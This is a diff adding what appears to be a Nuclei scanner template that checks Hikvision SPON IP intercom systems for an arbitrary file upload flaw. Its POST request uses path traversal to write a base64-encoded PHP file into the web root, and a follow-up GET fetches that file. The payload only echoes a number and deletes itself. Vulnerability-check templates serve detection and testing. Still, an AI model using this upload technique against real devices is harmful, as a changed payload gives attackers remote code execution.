@@ -1,0 +1,43 @@
+id: Hikvision_22
+info:
+  name: 海康威视SPON IP网络对讲广播系统busyscreenshotpush存在任意文件上传
+  author: YanXi
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: Hikvision
+http:
+  - raw:
+      - |-
+        POST /php/busyscreenshotpush.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+        Content-Length: 181
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+
+        jsondata[caller]=1&jsondata[callee]=1&jsondata[imagename]=..\..\..\Wnmp\WWW\upload\1_0_xjayuiwqzj.php&jsondata[imagecontent]=PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==
+      - |+
+        GET {{RootURL}}/upload/1_0_xjayuiwqzj.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '12321'
+      - type: word
+        part: body
+        words:
+          - '"res":"-2"'
